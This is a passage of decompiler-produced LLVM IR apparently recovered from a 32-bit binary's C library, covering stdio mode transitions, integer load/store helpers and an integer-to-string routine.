  store i32 %v3_804f3ae, i32* %v3_804f3b1, align 4
  %v0_804f3b4 = load i32, i32* @ebx, align 4
  %v1_804f3b4 = inttoptr i32 %v0_804f3b4 to i32*
  %v2_804f3b4 = load i32, i32* %v1_804f3b4, align 4
  %v2_804f3b4.tr = trunc i32 %v2_804f3b4 to i16
  %v1_804f3b9 = and i16 %v2_804f3b4.tr, -65
  %v3_804f3b9 = inttoptr i32 %v0_804f3b4 to i16*
  store i16 %v1_804f3b9, i16* %v3_804f3b9, align 2
  %v0_804f3bc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f3bc

dec_label_pc_804f3bc:                             ; preds = %dec_label_pc_804f39a, %dec_label_pc_804f3ae
  %v2_804f3c1 = phi i32 [ %v0_804f3a1, %dec_label_pc_804f39a ], [ %v0_804f3bc.pre, %dec_label_pc_804f3ae ]
  %v1_804f3bc = inttoptr i32 %v2_804f3c1 to i32*
  %v2_804f3bc = load i32, i32* %v1_804f3bc, align 4
  %v1_804f3be = or i32 %v2_804f3bc, 1
  %v1_804f3c1 = trunc i32 %v1_804f3be to i16
  %v3_804f3c1 = inttoptr i32 %v2_804f3c1 to i16*
  store i16 %v1_804f3c1, i16* %v3_804f3c1, align 2
  br label %dec_label_pc_804f3c6

dec_label_pc_804f3c6:                             ; preds = %dec_label_pc_804f38d, %dec_label_pc_804f3bc
  %storemerge = phi i32 [ 0, %dec_label_pc_804f3bc ], [ -1, %dec_label_pc_804f38d ]
  %v2_804f3c6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f3c6, i32* @edx, align 4
  store i32 %v0_804f35c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804f368, { 0, 2, 1 }
  uselistorder i32 %v0_804f35c, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f3c6, { 1, 0 }
  uselistorder label %dec_label_pc_804f3bc, { 1, 0 }
  uselistorder label %dec_label_pc_804f37b, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f3cc = load i32, i32* @ebx, align 4
  %v4_804f3d0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f3d0, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_804f3d8 = load i16, i16* %arg1, align 2
  %v3_804f3d8 = zext i16 %v2_804f3d8 to i32
  store i32 %v3_804f3d8, i32* %eax.global-to-local, align 4
  %v2_804f3db = and i32 %v3_804f3d8, %arg2
  %v3_804f3db = icmp eq i32 %v2_804f3db, 0
  %v1_804f3dd = icmp eq i1 %v3_804f3db, false
  br i1 %v1_804f3dd, label %dec_label_pc_804f3eb, label %dec_label_pc_804f3df

dec_label_pc_804f3df:                             ; preds = %entry
  %v1_804f3df = and i32 %v3_804f3d8, 2176
  %v2_804f3df = icmp eq i32 %v1_804f3df, 0
  %v1_804f3e4 = icmp eq i1 %v2_804f3df, false
  br i1 %v1_804f3e4, label %dec_label_pc_804f3f3, label %dec_label_pc_804f3e6

dec_label_pc_804f3e6:                             ; preds = %dec_label_pc_804f3df
  %v2_804f3e6 = or i32 %v3_804f3d8, %arg2
  store i32 %v2_804f3e6, i32* %eax.global-to-local, align 4
  %v1_804f3e8 = trunc i32 %v2_804f3e6 to i16
  store i16 %v1_804f3e8, i16* %arg1, align 2
  %v0_804f3eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f3eb

dec_label_pc_804f3eb:                             ; preds = %entry, %dec_label_pc_804f3e6
  %v0_804f434 = phi i32 [ %v4_804f3d0, %entry ], [ %v0_804f3eb.pre, %dec_label_pc_804f3e6 ]
  %v1_804f3eb = inttoptr i32 %v0_804f434 to i16*
  %v2_804f3eb = load i16, i16* %v1_804f3eb, align 2
  %v3_804f3eb = zext i16 %v2_804f3eb to i32
  store i32 %v3_804f3eb, i32* %edx.global-to-local, align 4
  %v2_804f3ee = and i16 %v2_804f3eb, 32
  %v3_804f3ee = icmp eq i16 %v2_804f3ee, 0
  br i1 %v3_804f3ee, label %dec_label_pc_804f40b, label %dec_label_pc_804f3f3

dec_label_pc_804f3f3:                             ; preds = %dec_label_pc_804f3eb, %dec_label_pc_804f3df
  %v1_804f3f3 = call i32 @__errno_location(i32 %v0_804f3cc)
  store i32 %v1_804f3f3, i32* %eax.global-to-local, align 4
  %v1_804f3f8 = inttoptr i32 %v1_804f3f3 to i32*
  store i32 9, i32* %v1_804f3f8, align 4
  br label %dec_label_pc_804f3fe

dec_label_pc_804f3fe:                             ; preds = %dec_label_pc_804f422, %dec_label_pc_804f3f3
  %v0_804f3fe = load i32, i32* @ebx, align 4
  %v1_804f3fe = inttoptr i32 %v0_804f3fe to i32*
  %v2_804f3fe = load i32, i32* %v1_804f3fe, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804f403 = or i32 %v2_804f3fe, 8
  store i32 %v1_804f403, i32* %eax.global-to-local, align 4
  %v1_804f406 = trunc i32 %v1_804f403 to i16
  %v3_804f406 = inttoptr i32 %v0_804f3fe to i16*
  store i16 %v1_804f406, i16* %v3_804f406, align 2
  br label %dec_label_pc_804f46d

dec_label_pc_804f40b:                             ; preds = %dec_label_pc_804f3eb
  %v2_804f40b = urem i16 %v2_804f3eb, 4
  %v3_804f40b = icmp eq i16 %v2_804f40b, 0
  br i1 %v3_804f40b, label %dec_label_pc_804f455, label %dec_label_pc_804f410

dec_label_pc_804f410:                             ; preds = %dec_label_pc_804f40b
  %v2_804f410 = and i32 %v3_804f3eb, 4
  %v3_804f410 = icmp eq i32 %v2_804f410, 0
  %v1_804f413 = icmp eq i1 %v3_804f410, false
  br i1 %v1_804f413, label %dec_label_pc_804f441, label %dec_label_pc_804f415

dec_label_pc_804f415:                             ; preds = %dec_label_pc_804f410
  %v1_804f415 = add i32 %v0_804f434, 20
  %v2_804f415 = inttoptr i32 %v1_804f415 to i32*
  %v3_804f415 = load i32, i32* %v2_804f415, align 4
  store i32 %v3_804f415, i32* %eax.global-to-local, align 4
  %v2_804f418 = add i32 %v0_804f434, 16
  %v3_804f418 = inttoptr i32 %v2_804f418 to i32*
  %v4_804f418 = load i32, i32* %v3_804f418, align 4
  %v15_804f418 = icmp eq i32 %v3_804f415, %v4_804f418
  %v1_804f41b = icmp eq i1 %v15_804f418, false
  br i1 %v1_804f41b, label %dec_label_pc_804f422, label %dec_label_pc_804f41d

dec_label_pc_804f41d:                             ; preds = %dec_label_pc_804f415
  %v2_804f41d = and i32 %v3_804f3eb, 2
  %v3_804f41d = icmp eq i32 %v2_804f41d, 0
  br i1 %v3_804f41d, label %dec_label_pc_804f441, label %dec_label_pc_804f422

dec_label_pc_804f422:                             ; preds = %dec_label_pc_804f41d, %dec_label_pc_804f415
  %v1_804f422 = and i32 %v3_804f3eb, 1024
  store i32 %v1_804f422, i32* %edx.global-to-local, align 4
  %tmp15 = udiv i32 %v1_804f422, 1024
  %tmp16 = xor i32 %tmp15, 3
  store i32 %tmp16, i32* %eax.global-to-local, align 4
  %v5_804f435 = call i32 @__GI_fseek(i32 %v0_804f434, i32 0, i32 %tmp16, i32 %v1_804f422)
  store i32 %v5_804f435, i32* %eax.global-to-local, align 4
  %v1_804f43d = icmp eq i32 %v5_804f435, 0
  %v1_804f43f = icmp eq i1 %v1_804f43d, false
  br i1 %v1_804f43f, label %dec_label_pc_804f3fe, label %dec_label_pc_804f422.dec_label_pc_804f441_crit_edge

dec_label_pc_804f422.dec_label_pc_804f441_crit_edge: ; preds = %dec_label_pc_804f422
  %v0_804f441.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f441

dec_label_pc_804f441:                             ; preds = %dec_label_pc_804f422.dec_label_pc_804f441_crit_edge, %dec_label_pc_804f41d, %dec_label_pc_804f410
  %v2_804f446 = phi i32 [ %v0_804f441.pre, %dec_label_pc_804f422.dec_label_pc_804f441_crit_edge ], [ %v0_804f434, %dec_label_pc_804f41d ], [ %v0_804f434, %dec_label_pc_804f410 ]
  %v1_804f441 = inttoptr i32 %v2_804f446 to i32*
  %v2_804f441 = load i32, i32* %v1_804f441, align 4
  %v1_804f443 = and i32 %v2_804f441, -4
  store i32 %v1_804f443, i32* %eax.global-to-local, align 4
  %v1_804f446 = trunc i32 %v1_804f443 to i16
  %v3_804f446 = inttoptr i32 %v2_804f446 to i16*
  store i16 %v1_804f446, i16* %v3_804f446, align 2
  %v0_804f449 = load i32, i32* @ebx, align 4
  %v1_804f449 = add i32 %v0_804f449, 8
  %v2_804f449 = inttoptr i32 %v1_804f449 to i32*
  %v3_804f449 = load i32, i32* %v2_804f449, align 4
  store i32 %v3_804f449, i32* %eax.global-to-local, align 4
  %v2_804f44c = add i32 %v0_804f449, 24
  %v3_804f44c = inttoptr i32 %v2_804f44c to i32*
  store i32 %v3_804f449, i32* %v3_804f44c, align 4
  %v0_804f44f = load i32, i32* %eax.global-to-local, align 4
  %v1_804f44f = load i32, i32* @ebx, align 4
  %v2_804f44f = add i32 %v1_804f44f, 16
  %v3_804f44f = inttoptr i32 %v2_804f44f to i32*
  store i32 %v0_804f44f, i32* %v3_804f44f, align 4
  %v0_804f452 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f452 = load i32, i32* @ebx, align 4
  %v2_804f452 = add i32 %v1_804f452, 20
  %v3_804f452 = inttoptr i32 %v2_804f452 to i32*
  store i32 %v0_804f452, i32* %v3_804f452, align 4
  %v0_804f455.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f455

dec_label_pc_804f455:                             ; preds = %dec_label_pc_804f40b, %dec_label_pc_804f441
  %v2_804f45c = phi i32 [ %v0_804f434, %dec_label_pc_804f40b ], [ %v0_804f455.pre, %dec_label_pc_804f441 ]
  %v1_804f455 = inttoptr i32 %v2_804f45c to i32*
  %v2_804f455 = load i32, i32* %v1_804f455, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804f459 = or i32 %v2_804f455, 64
  store i32 %v1_804f459, i32* %eax.global-to-local, align 4
  %v1_804f45c = trunc i32 %v1_804f459 to i16
  %v3_804f45c = inttoptr i32 %v2_804f45c to i16*
  store i16 %v1_804f45c, i16* %v3_804f45c, align 2
  %v0_804f45f = load i32, i32* %eax.global-to-local, align 4
  %v1_804f45f = urem i32 %v0_804f45f, 65536
  store i32 %v1_804f45f, i32* %eax.global-to-local, align 4
  %v3_804f462 = and i32 %v0_804f45f, 2816
  %v4_804f462 = icmp eq i32 %v3_804f462, 0
  %v1_804f465 = icmp eq i1 %v4_804f462, false
  br i1 %v1_804f465, label %dec_label_pc_804f46d, label %dec_label_pc_804f467

dec_label_pc_804f467:                             ; preds = %dec_label_pc_804f455
  %v0_804f467 = load i32, i32* @ebx, align 4
  %v1_804f467 = add i32 %v0_804f467, 12
  %v2_804f467 = inttoptr i32 %v1_804f467 to i32*
  %v3_804f467 = load i32, i32* %v2_804f467, align 4
  store i32 %v3_804f467, i32* %eax.global-to-local, align 4
  %v2_804f46a = add i32 %v0_804f467, 28
  %v3_804f46a = inttoptr i32 %v2_804f46a to i32*
  store i32 %v3_804f467, i32* %v3_804f46a, align 4
  br label %dec_label_pc_804f46d

dec_label_pc_804f46d:                             ; preds = %dec_label_pc_804f455, %dec_label_pc_804f3fe, %dec_label_pc_804f467
  %v0_804f46d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f46d, i32* %eax.global-to-local, align 4
  %v2_804f46f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f46f, i32* %edx.global-to-local, align 4
  store i32 %v0_804f3cc, i32* @ebx, align 4
  ret i32 %v0_804f46d

; uselistorder directives
  uselistorder i32 %v0_804f45f, { 1, 0 }
  uselistorder i32 %v1_804f422, { 1, 0, 2 }
  uselistorder i32 %v0_804f434, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_804f3d8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804f3cc, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 7, 6, 5, 8, 3, 1, 2, 4 }
  uselistorder i16 32, { 3, 0, 1, 2 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f46d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f455, { 1, 0 }
  uselistorder label %dec_label_pc_804f3eb, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_804f474 = icmp slt i32 %tmp5, 0
  %v3_804f4a5 = and i32 %tmp4, 2048
  %v4_804f4a5 = icmp eq i32 %v3_804f4a5, 0
  br i1 %v5_804f474, label %dec_label_pc_804f4a5, label %dec_label_pc_804f483

dec_label_pc_804f483:                             ; preds = %entry
  %v1_804f486 = icmp eq i1 %v4_804f4a5, false
  br i1 %v1_804f486, label %dec_label_pc_804f4aa, label %dec_label_pc_804f488

dec_label_pc_804f488:                             ; preds = %dec_label_pc_804f483
  %v6_804f488 = icmp eq i32 %tmp4, 256
  %v1_804f48e = inttoptr i32 %tmp to i32*
  %v2_804f48e = load i32, i32* %v1_804f48e, align 4
  %v1_804f490 = icmp eq i1 %v6_804f488, false
  br i1 %v1_804f490, label %dec_label_pc_804f497, label %dec_label_pc_804f492

dec_label_pc_804f492:                             ; preds = %dec_label_pc_804f488
  %v1_804f492 = urem i32 %v2_804f48e, 256
  br label %dec_label_pc_804f4a2

dec_label_pc_804f497:                             ; preds = %dec_label_pc_804f488
  %v6_804f497 = icmp eq i32 %tmp4, 512
  %v1_804f49d = icmp eq i1 %v6_804f497, false
  br i1 %v1_804f49d, label %dec_label_pc_804f4a2, label %dec_label_pc_804f49f

dec_label_pc_804f49f:                             ; preds = %dec_label_pc_804f497
  %v1_804f49f = urem i32 %v2_804f48e, 65536
  br label %dec_label_pc_804f4a2

dec_label_pc_804f4a2:                             ; preds = %dec_label_pc_804f497, %dec_label_pc_804f492, %dec_label_pc_804f49f
  %v0_804f4a4 = phi i32 [ %v2_804f48e, %dec_label_pc_804f497 ], [ %v1_804f492, %dec_label_pc_804f492 ], [ %v1_804f49f, %dec_label_pc_804f49f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804f4a4

dec_label_pc_804f4a5:                             ; preds = %entry
  br i1 %v4_804f4a5, label %dec_label_pc_804f4b0, label %dec_label_pc_804f4aa

dec_label_pc_804f4aa:                             ; preds = %dec_label_pc_804f4a5, %dec_label_pc_804f483
  %v1_804f4aa = add i32 %tmp, 4
  %v2_804f4aa = inttoptr i32 %v1_804f4aa to i32*
  %v3_804f4aa = load i32, i32* %v2_804f4aa, align 4
  store i32 %v3_804f4aa, i32* @edx, align 4
  %v1_804f4ad = inttoptr i32 %tmp to i32*
  %v2_804f4ad = load i32, i32* %v1_804f4ad, align 4
  ret i32 %v2_804f4ad

dec_label_pc_804f4b0:                             ; preds = %dec_label_pc_804f4a5
  %v6_804f4b0 = icmp eq i32 %tmp4, 256
  %v1_804f4b6 = inttoptr i32 %tmp to i32*
  %v2_804f4b6 = load i32, i32* %v1_804f4b6, align 4
  %v1_804f4b8 = icmp eq i1 %v6_804f4b0, false
  br i1 %v1_804f4b8, label %dec_label_pc_804f4bf, label %dec_label_pc_804f4ba

dec_label_pc_804f4ba:                             ; preds = %dec_label_pc_804f4b0
  %v1_804f4ba = mul i32 %v2_804f4b6, 16777216
  %v2_804f4ba = sdiv i32 %v1_804f4ba, 16777216
  br label %dec_label_pc_804f4c8

dec_label_pc_804f4bf:                             ; preds = %dec_label_pc_804f4b0
  %v6_804f4bf = icmp eq i32 %tmp4, 512
  %v1_804f4c5 = icmp eq i1 %v6_804f4bf, false
  br i1 %v1_804f4c5, label %dec_label_pc_804f4c8, label %dec_label_pc_804f4c7

dec_label_pc_804f4c7:                             ; preds = %dec_label_pc_804f4bf
  %v1_804f4c7 = mul i32 %v2_804f4b6, 65536
  %v2_804f4c7 = sdiv i32 %v1_804f4c7, 65536
  br label %dec_label_pc_804f4c8

dec_label_pc_804f4c8:                             ; preds = %dec_label_pc_804f4bf, %dec_label_pc_804f4ba, %dec_label_pc_804f4c7
  %v0_804f4c8 = phi i32 [ %v2_804f4b6, %dec_label_pc_804f4bf ], [ %v2_804f4ba, %dec_label_pc_804f4ba ], [ %v2_804f4c7, %dec_label_pc_804f4c7 ]
  %v1_804f4c8 = ashr i32 %v0_804f4c8, 31
  store i32 %v1_804f4c8, i32* @edx, align 4
  ret i32 %v0_804f4c8

; uselistorder directives
  uselistorder i32 %v0_804f4c8, { 1, 0 }
  uselistorder i32 %v2_804f4b6, { 2, 0, 1 }
  uselistorder i32 %v2_804f48e, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 6, 5, 8, 7, 10, 9, 12, 11 }
  uselistorder label %dec_label_pc_804f4c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f4a2, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_2()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f4cc = load i32, i32* @ebx, align 4
  store i32 %v0_804f4cc, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804f4d1 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804f4d1, i32* %ebx.global-to-local, align 4
  %v4_804f4d5 = trunc i32 %tmp4 to i16
  %v6_804f4dd = icmp eq i32 %tmp6, 256
  %v1_804f4e3 = icmp eq i1 %v6_804f4dd, false
  br i1 %v1_804f4e3, label %dec_label_pc_804f4e9, label %dec_label_pc_804f4e5

dec_label_pc_804f4e5:                             ; preds = %entry
  %v2_804f4e5 = trunc i32 %tmp4 to i8
  %v4_804f4e5 = bitcast i16* %tmp5 to i8*
  store i8 %v2_804f4e5, i8* %v4_804f4e5, align 1
  br label %dec_label_pc_804f507

dec_label_pc_804f4e9:                             ; preds = %entry
  %v6_804f4e9 = icmp eq i32 %tmp6, 2048
  %v1_804f4ef = icmp eq i1 %v6_804f4e9, false
  br i1 %v1_804f4ef, label %dec_label_pc_804f4f8, label %dec_label_pc_804f4f1

dec_label_pc_804f4f1:                             ; preds = %dec_label_pc_804f4e9
  %sext2 = mul i32 %tmp4, 65536
  %v1_804f4f1 = sdiv i32 %sext2, 65536
  %v3_804f4f1 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f4f1, i32* %v3_804f4f1, align 4
  %v0_804f4f3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f4f3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f4f3 = add i32 %v1_804f4f3, 4
  %v3_804f4f3 = inttoptr i32 %v2_804f4f3 to i32*
  store i32 %v0_804f4f3, i32* %v3_804f4f3, align 4
  br label %dec_label_pc_804f507

dec_label_pc_804f4f8:                             ; preds = %dec_label_pc_804f4e9
  %v6_804f4f8 = icmp eq i32 %tmp6, 512
  %v1_804f4fe = icmp eq i1 %v6_804f4f8, false
  br i1 %v1_804f4fe, label %dec_label_pc_804f505, label %dec_label_pc_804f500

dec_label_pc_804f500:                             ; preds = %dec_label_pc_804f4f8
  store i16 %v4_804f4d5, i16* %tmp5, align 2
  br label %dec_label_pc_804f507

dec_label_pc_804f505:                             ; preds = %dec_label_pc_804f4f8
  %sext3 = mul i32 %tmp4, 65536
  %v1_804f505 = sdiv i32 %sext3, 65536
  %v3_804f505 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f505, i32* %v3_804f505, align 4
  br label %dec_label_pc_804f507

dec_label_pc_804f507:                             ; preds = %dec_label_pc_804f500, %dec_label_pc_804f4f1, %dec_label_pc_804f4e5, %dec_label_pc_804f505
  %v2_804f507 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f507, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804f508 = sdiv i32 %sext, 65536
  ret i32 %v1_804f508

; uselistorder directives
  uselistorder i32 512, { 0, 1, 2, 6, 3, 7, 8, 4, 5 }
  uselistorder label %dec_label_pc_804f507, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804f517 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f517, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804f523 = icmp slt i32 %arg4, 0
  %v1_804f525 = icmp eq i1 %v2_804f523, false
  br i1 %v1_804f525, label %dec_label_pc_804f546, label %dec_label_pc_804f527

dec_label_pc_804f527:                             ; preds = %entry
  %v1_804f527 = sub i32 0, %arg4
  store i32 %v1_804f527, i32* %esi.global-to-local, align 4
  %v2_804f529 = icmp slt i32 %arg3, 0
  %v1_804f52b = icmp eq i1 %v2_804f529, false
  br i1 %v1_804f52b, label %dec_label_pc_804f546, label %dec_label_pc_804f52d

dec_label_pc_804f52d:                             ; preds = %dec_label_pc_804f527
  %v1_804f52d = sub i32 0, %arg2
  %v5_804f52d = icmp ne i32 %arg2, 0
  store i32 %v1_804f52d, i32* %ecx.global-to-local, align 4
  %v2_804f52f = zext i1 %v5_804f52d to i32
  %v3_804f52f = add i32 %v2_804f52f, %arg3
  %v1_804f532 = sub i32 0, %v3_804f52f
  store i32 %v1_804f532, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f546

dec_label_pc_804f546:                             ; preds = %entry, %dec_label_pc_804f527, %dec_label_pc_804f52d
  %v0_804f54b = phi i32 [ %v1_804f527, %dec_label_pc_804f52d ], [ %v1_804f527, %dec_label_pc_804f527 ], [ %arg4, %entry ]
  %storemerge12 = phi i32 [ 1, %dec_label_pc_804f52d ], [ 0, %dec_label_pc_804f527 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_804f54b
  %tmp31 = urem i32 -1, %v0_804f54b
  store i8 0, i8* %arg1, align 1
  %v1_804f550 = add i32 %tmp31, 1
  %v1_804f551 = load i32, i32* %esi.global-to-local, align 4
  %v12_804f551 = icmp eq i32 %v1_804f550, %v1_804f551
  %v1_804f55b = icmp eq i1 %v12_804f551, false
  br i1 %v1_804f55b, label %dec_label_pc_804f56a, label %dec_label_pc_804f55d

dec_label_pc_804f55d:                             ; preds = %dec_label_pc_804f546
  %v1_804f55d = add i32 %div, 1
  br label %dec_label_pc_804f56a

dec_label_pc_804f56a:                             ; preds = %dec_label_pc_804f546, %dec_label_pc_804f55d
  %stack_var_-20.0.off0 = phi i32 [ %v1_804f550, %dec_label_pc_804f546 ], [ 0, %dec_label_pc_804f55d ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804f546 ], [ %v1_804f55d, %dec_label_pc_804f55d ]
  %v0_804f56a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f56a, i32* %ebp.global-to-local, align 4
  %v0_804f56c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f56c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f570

dec_label_pc_804f570:                             ; preds = %dec_label_pc_804f5be, %dec_label_pc_804f56a
  %v0_804f5a7 = phi i32 [ %v0_804f5c0, %dec_label_pc_804f5be ], [ %v0_804f56a, %dec_label_pc_804f56a ]
  %v0_804f574 = phi i32 [ %v1_804f5c2, %dec_label_pc_804f5be ], [ %v0_804f56c, %dec_label_pc_804f56a ]
  %v1_804f570 = icmp eq i32 %v0_804f574, 0
  br i1 %v1_804f570, label %dec_label_pc_804f5a7, label %dec_label_pc_804f574

dec_label_pc_804f574:                             ; preds = %dec_label_pc_804f570
  %v0_804f578 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_804f574, %v0_804f578
  %tmp32 = urem i32 %v0_804f574, %v0_804f578
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_804f5a7, %v0_804f578
  %tmp33 = urem i32 %v0_804f5a7, %v0_804f578
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_804f58b = mul i32 %tmp32, %stack_var_-20.0.off0
  %v2_804f58f = add i32 %tmp33, %v6_804f58b
  %v8_804f595 = mul i32 %tmp32, %stack_var_-24.0.in
  %v2_804f59a = add i32 %div8, %v8_804f595
  store i32 %v2_804f59a, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_804f58f, %v0_804f578
  %tmp34 = urem i32 %v2_804f58f, %v0_804f578
  %v2_804f5a2 = add i32 %div9, %v2_804f59a
  br label %dec_label_pc_804f5af

dec_label_pc_804f5a7:                             ; preds = %dec_label_pc_804f570
  %v0_804f5ab = load i32, i32* %esi.global-to-local, align 4
  %div11 = udiv i32 %v0_804f5a7, %v0_804f5ab
  %tmp35 = urem i32 %v0_804f5a7, %v0_804f5ab
  br label %dec_label_pc_804f5af

dec_label_pc_804f5af:                             ; preds = %dec_label_pc_804f574, %dec_label_pc_804f5a7
  %v13_804f5b5 = phi i32 [ %tmp34, %dec_label_pc_804f574 ], [ %tmp35, %dec_label_pc_804f5a7 ]
  %storemerge = phi i32 [ %v2_804f5a2, %dec_label_pc_804f574 ], [ %div11, %dec_label_pc_804f5a7 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804f5af = load i32, i32* %edi.global-to-local, align 4
  %v1_804f5af = add i32 %v0_804f5af, -1
  store i32 %v1_804f5af, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_804f5b5, 10
  br i1 %tmp, label %dec_label_pc_804f5b5, label %dec_label_pc_804f5ba

dec_label_pc_804f5b5:                             ; preds = %dec_label_pc_804f5af
  %v2_804f5b5 = add i32 %v13_804f5b5, 48
  %v12_804f5b5 = and i32 %v2_804f5b5, 255
  %v14_804f5b5 = and i32 %v13_804f5b5, -256
  %v15_804f5b5 = or i32 %v12_804f5b5, %v14_804f5b5
  br label %dec_label_pc_804f5be

dec_label_pc_804f5ba:                             ; preds = %dec_label_pc_804f5af
  %v6_804f5ba = add i32 %v13_804f5b5, %arg5
  %v21_804f5ba = and i32 %v6_804f5ba, 255
  %v23_804f5ba = and i32 %v13_804f5b5, -256
  %v24_804f5ba = or i32 %v21_804f5ba, %v23_804f5ba
  br label %dec_label_pc_804f5be

dec_label_pc_804f5be:                             ; preds = %dec_label_pc_804f5b5, %dec_label_pc_804f5ba
  %storemerge10 = phi i32 [ %v15_804f5b5, %dec_label_pc_804f5b5 ], [ %v24_804f5ba, %dec_label_pc_804f5ba ]
  %v1_804f5be = trunc i32 %storemerge10 to i8
  %v3_804f5be = inttoptr i32 %v1_804f5af to i8*
  store i8 %v1_804f5be, i8* %v3_804f5be, align 1
  %v0_804f5c0 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f5c2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f5c2 = or i32 %v1_804f5c2, %v0_804f5c0
  %v3_804f5c2 = icmp eq i32 %v2_804f5c2, 0
  %v1_804f5c4 = icmp eq i1 %v3_804f5c2, false
  br i1 %v1_804f5c4, label %dec_label_pc_804f570, label %dec_label_pc_804f5c6

dec_label_pc_804f5c6:                             ; preds = %dec_label_pc_804f5be
  %v4_804f5c6 = icmp eq i32 %storemerge12, 0
  br i1 %v4_804f5c6, label %dec_label_pc_804f5d1, label %dec_label_pc_804f5cd

dec_label_pc_804f5cd:                             ; preds = %dec_label_pc_804f5c6
  %v0_804f5cd = load i32, i32* %edi.global-to-local, align 4
  %v1_804f5cd = add i32 %v0_804f5cd, -1
  store i32 %v1_804f5cd, i32* %edi.global-to-local, align 4
  %v1_804f5ce = inttoptr i32 %v1_804f5cd to i8*
  store i8 45, i8* %v1_804f5ce, align 1
  br label %dec_label_pc_804f5d1

dec_label_pc_804f5d1:                             ; preds = %dec_label_pc_804f5c6, %dec_label_pc_804f5cd
  %v0_804f5d4 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f5d4

; uselistorder directives
  uselistorder i32 %v13_804f5b5, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804f58f, { 1, 0 }
  uselistorder i32 %v0_804f578, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804f574, { 1, 0, 2 }
  uselistorder i32 %v0_804f5a7, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804f550, { 1, 0 }
  uselistorder i32 %v0_804f54b, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 255, { 1, 0, 5, 2, 3, 4, 6, 7, 8 }
